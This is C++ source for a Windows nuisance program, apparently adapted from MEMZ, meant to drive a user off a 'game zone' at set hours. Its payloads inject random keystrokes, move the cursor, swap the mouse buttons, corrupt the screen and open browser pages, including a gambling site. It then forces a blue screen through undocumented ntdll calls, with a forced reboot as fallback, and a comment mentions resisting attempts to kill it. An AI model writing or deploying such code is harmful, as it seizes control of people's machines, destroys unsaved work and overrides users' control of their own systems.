#include <windows.h>
#include <wininet.h>
#include <shellapi.h>
#include <iostream>
#include <atomic>
#include <thread>
#include <random>
#include <array>
#include <vector>
#include <functional>
#include "payloads.h"

#pragma comment(lib, "wininet") // fixes weird thing with wininet unresolved symbols
#pragma comment(lib, "shell32")

#define TIME_SECOND 1000
#define MAX_RUNTIME 15

std::random_device rd;
std::mt19937 mt(rd());
std::atomic<int> runtime = 0;

//#define FORCELOOP
#define TEST

void reboot(void) 
{
#ifdef TEST
	std::cout << "REBOOT" << std::endl;
	exit(1);
#else
	// straight up copied from memz
	// Try to force BSOD first
	// I like how this method even works in user mode without admin privileges on all Windows versions since XP (or 2000, idk)...
	// This isn't even an exploit, it's just an undocumented feature.
	HMODULE ntdll;
	FARPROC RtlAdjustPrivilege;
	FARPROC NtRaiseHardError;

	{
		if (!(ntdll = LoadLibraryA("ntdll"))) {
			goto failcase;
		}
		RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
		NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");

		if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL) {
			BOOLEAN tmp1; DWORD tmp2;
			((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(19, 1, 0, &tmp1);
			((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(0xc6942069, 0, 0, 0, 6, &tmp2);	// NOTE: this throws an exception in Visual Studio.  It's probably fine :shrug:
		}
	}

failcase:
	// If the computer is still running, do it the normal way
	HANDLE token;
	TOKEN_PRIVILEGES privileges;

	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);

	LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &privileges.Privileges[0].Luid);
	privileges.PrivilegeCount = 1;
	privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	AdjustTokenPrivileges(token, FALSE, &privileges, 0, (PTOKEN_PRIVILEGES)NULL, 0);

	// The actual restart
	ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK);
#endif
}

void PayloadMessageBox(void)
{
	const LPCTSTR messages[]{
		L"Please exit the game zone lol!",
		L"Please stop play game!!!1!!",
		L"Hehe funny joke plz leave now!",
		L"LMAO please log out!",
		L"Bruh...",
		L"REEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE",
		L"Leave",
		L"According to all known laws of aviation, there is no way that a bee should be able to fly. Its wings are too small to get its fat little body off the ground. The bee, of course, flies anyway. Because bees don’t care what humans think is impossible."
	};
	std::uniform_int_distribution<int> dist(0, sizeof(messages) / sizeof(*messages) - 1);

	for (;;) {
		//std::thread([&]() {
			MessageBox(nullptr, messages[dist(mt)], L"Wraning!", MB_OK | MB_ICONINFORMATION | MB_APPLMODAL);
		//}).detach();
		std::this_thread::sleep_for(std::chrono::seconds(MAX_RUNTIME * 2 - runtime * 2));
	}
}

void PayloadCursor(void)
{
	POINT cursor;
	std::uniform_int_distribution<int> dist(0, 2);

	// TODO: scale less horribly early
	for (;;) {
		GetCursorPos(&cursor);

		cursor.x += ((dist(mt) - 1) * 2) * runtime / 2;
		cursor.y += ((dist(mt) - 1) * 2) * runtime / 2;
		SetCursorPos(cursor.x, cursor.y);

		std::this_thread::sleep_for(std::chrono::milliseconds(max(0, MAX_RUNTIME * 40 - (runtime + 1) * 40)));
	}
}

void PayloadKeyboardInput(void)
{
	INPUT input;
	// 0-9 a-z
	// TODO: curate list
	std::uniform_int_distribution<int> dist(0x30, 0x5A);

	input.type = INPUT_KEYBOARD;
	input.ki.wScan = 0; // hardware scan code for key
	input.ki.time = 0;
	input.ki.dwExtraInfo = 0;
	input.ki.dwFlags = 0; // 0 for key press
	for (;;) {
		input.ki.wVk = dist(mt);
		SendInput(1, &input, sizeof(input));
		//input.ki.dwFlags = KEYEVENTF_KEYUP; // KEYEVENTF_KEYUP for key release
		//SendInput(1, &input, sizeof(INPUT));
		std::this_thread::sleep_for(std::chrono::seconds(16 - runtime));
	}
}

void PayloadSwapMouseButtons(void)
{
	for (;;) {
		SwapMouseButton(false);
		std::this_thread::sleep_for(std::chrono::seconds(30 - (runtime * 2)));
		SwapMouseButton(true);
		std::this_thread::sleep_for(std::chrono::seconds(1));
	}
}

void PayloadScreenGlitch(void)
{
	auto x = GetSystemMetrics(SM_CXSCREEN);
	auto y = GetSystemMetrics(SM_CYSCREEN);
	std::uniform_int_distribution<int> dx(0, x);
	std::uniform_int_distribution<int> dy(0, y);
	std::uniform_int_distribution<int> cx(200, x);
	std::uniform_int_distribution<int> cy(200, y);

	int waittime = 15;

	HWND hwnd = GetDesktopWindow();
	HDC hdc = GetWindowDC(hwnd);
	for (;;) {
		BitBlt(hdc, dx(mt), dy(mt), cx(mt), cy(mt), hdc, dx(mt), dx(mt), SRCCOPY);
		std::this_thread::sleep_for(std::chrono::seconds(static_cast<int>(waittime - std::floor(runtime / (MAX_RUNTIME / waittime)))));
	}
}

void PayloadInvert(void) {
	HWND hwnd = GetDesktopWindow();
	HDC hdc = GetWindowDC(hwnd);
	auto w = GetSystemMetrics(SM_CXSCREEN);
	auto h = GetSystemMetrics(SM_CYSCREEN);

	for (;;) {
		BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);
		std::this_thread::sleep_for(std::chrono::seconds(20 - runtime));
	}
}

bool open_browser(const char* url, HWND parent = NULL)
{
	// Try normally, with the default verb (which will typically be "open")
	HINSTANCE result = ShellExecuteA(parent, NULL, url, NULL, NULL, SW_SHOWNORMAL);

	// If that fails due to privileges, let's ask for more and try again
	if ((int)result == SE_ERR_ACCESSDENIED) {
		std::cout << "NO PERMISSION" << std::endl;
		result = ShellExecuteA(parent, "runas", url, NULL, NULL, SW_SHOWNORMAL);
	}

	// Return whether or not we were successful.
	return ((int)result > 32);
}

void PayloadBrowser(void)
{
	LPCSTR searches[] = {
		"https://www.google.com/search?q=epic+gamer+montag",
		"https://www.google.com/search?q=doritos",
		"https://www.google.com/search?q=mountain%20dew",
		"https://www.google.com/search?q=lol%20epic%20combos",
		"https://www.google.com/search?q=how%202%20b%20epic%20gamr",
		"https://sites.google.com/a/ausdg.us/force-and-motion/the-entire-bee-movie-script",
		"https://www.google.com/search?q=bedtime+stories",
		"https://www.google.com/search?q=epic%20fortnite%20dance",
		"http://csgojackpot.cash/"
	};

	for (;;) {
		open_browser(searches[mt() % sizeof(searches) / sizeof(*searches)]);
		std::this_thread::sleep_for(std::chrono::seconds(90 - (runtime * 2)));
	}
}

// todo:
//  DONE multithread 
//  anti killer - FIXED with scheduler
//  DONE bsod at end
void LaunchPayloads(void)
{
	std::array<std::function<void(void)>, 7> payloads = {
			PayloadKeyboardInput,
			PayloadSwapMouseButtons,
			PayloadCursor,
			PayloadBrowser,
			PayloadScreenGlitch,
			PayloadMessageBox,
			PayloadInvert
	};

	for (unsigned i = 0; i < payloads.size(); i++) {
		std::thread(payloads.at(i)).detach();
#ifdef TEST
		std::this_thread::sleep_for(std::chrono::seconds(5));
#else
		std::this_thread::sleep_for(std::chrono::seconds(60));
#endif
	}
}

void displayIcon(HDC hdc, int ix, int iy, int w, int h, HICON icon) {
	for (;;) {
		DrawIcon(hdc, mt() % (w - ix), mt() % (h - iy), icon);
	}
}

void yesnobox(void) {
	if (MessageBox(nullptr, L"The game zone is closed at this time.  Please log out", L"Warning", MB_OKCANCEL | MB_ICONHAND | MB_APPLMODAL) == IDCANCEL) {
		for (int i = 0; i < 10; ++i) {
			int ix = GetSystemMetrics(SM_CXICON) / 2;
			int iy = GetSystemMetrics(SM_CYICON) / 2;
			HWND hwnd = GetDesktopWindow();
			HDC hdc = GetWindowDC(hwnd);
			RECT r;
			GetWindowRect(hwnd, &r);
			int w = r.right - r.left;
			int h = r.bottom - r.top;
			HICON icon = LoadIcon(nullptr, IDI_ERROR);

			std::thread(displayIcon, hdc, ix, iy, w, h, icon).detach();
		}
		std::this_thread::sleep_for(std::chrono::seconds(5));
		reboot();
	}
}

int main(void)
{


	for (;;) {

		time_t t = time(NULL);
		tm tptr;
		localtime_s(&tptr, &t);
		if (tptr.tm_hour > 18 && (tptr.tm_hour < 23 || tptr.tm_wday == 6)) { // NOTE: this breaks if the user is able to change time
#ifdef TEST
			std::cout << "Game time" << std::endl;
#ifdef FORCELOOP
			goto startofend;
#endif
			std::this_thread::sleep_for(std::chrono::seconds(5));
#else
			std::this_thread::sleep_for(std::chrono::minutes(5));
#endif
			continue;
		}
#ifdef TEST
		std::cout << "Not game time" << std::endl;
#endif

		std::thread(yesnobox).detach();
		std::thread(LaunchPayloads).detach();
		for (runtime = 0; runtime <= MAX_RUNTIME; runtime++) {
#ifdef TEST
			std::cout << "running for: " << runtime << std::endl;
			std::this_thread::sleep_for(std::chrono::seconds(5));
#else
			std::this_thread::sleep_for(std::chrono::seconds(60));
#endif
		}
		reboot();
	}
}